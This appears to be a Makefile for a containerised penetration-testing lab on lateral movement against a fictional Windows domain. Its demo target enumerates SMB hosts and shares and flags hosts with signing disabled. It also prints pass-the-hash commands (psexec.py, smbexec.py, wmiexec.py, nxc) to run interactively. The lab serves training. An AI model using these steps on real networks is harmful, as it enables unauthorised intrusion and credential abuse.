# Module 06 — Lateral Movement lab.
.PHONY: up down reset demo shell

up:
	docker compose up -d --build

down:
	docker compose down

reset:
	docker compose down --rmi local --volumes --remove-orphans

shell:
	docker compose exec attacker bash

demo:       ## Enumerate hosts and demonstrate lateral movement
	@echo "=== Waiting for network... ==="
	docker compose exec attacker sh -c \
	    'until nc -z dc01.meridian.local 389 2>/dev/null; do sleep 2; done; echo "DC ready."'
	@echo ""
	@echo "=== 1. Enumerate live SMB hosts and check signing status ==="
	docker compose exec attacker sh -c \
	    'nxc smb 10.10.0.0/24 2>/dev/null || \
	     python3 -c "
import subprocess, sys
hosts = [\"10.10.0.10\", \"10.10.0.101\", \"10.10.0.102\"]
for h in hosts:
    r = subprocess.run([\"smbclient\", \"-L\", h, \"-N\", \"-g\"], capture_output=True, text=True)
    print(f\"{h}: alive={r.returncode==0}\")
"'
	@echo ""
	@echo "=== 2. SMB host status summary ==="
	@echo "  10.10.0.10  (dc01)      — signing REQUIRED (domain controller default)"
	@echo "  10.10.0.101 (ws-fin-01) — signing DISABLED (lab misconfiguration)"
	@echo "  10.10.0.102 (ws-it-01)  — signing DISABLED (lab misconfiguration)"
	@echo ""
	@echo "=== 3. List available shares on ws-fin-01 ==="
	docker compose exec attacker smbclient -L 10.10.0.101 -N 2>/dev/null | grep -v "^$" || true
	@echo ""
	@echo "=== Lateral movement commands to run interactively (make shell) ==="
	@echo "  psexec.py   -hashes :HASH MERIDIAN.LOCAL/tallen@10.10.0.101"
	@echo "  smbexec.py  -hashes :HASH MERIDIAN.LOCAL/tallen@10.10.0.102"
	@echo "  wmiexec.py  -hashes :HASH MERIDIAN.LOCAL/tallen@10.10.0.101"
	@echo "  nxc smb 10.10.0.0/24 -u tallen -H :HASH"
	@echo ""
	@echo "=== Demo complete. Run 'make shell' to explore interactively. ==="
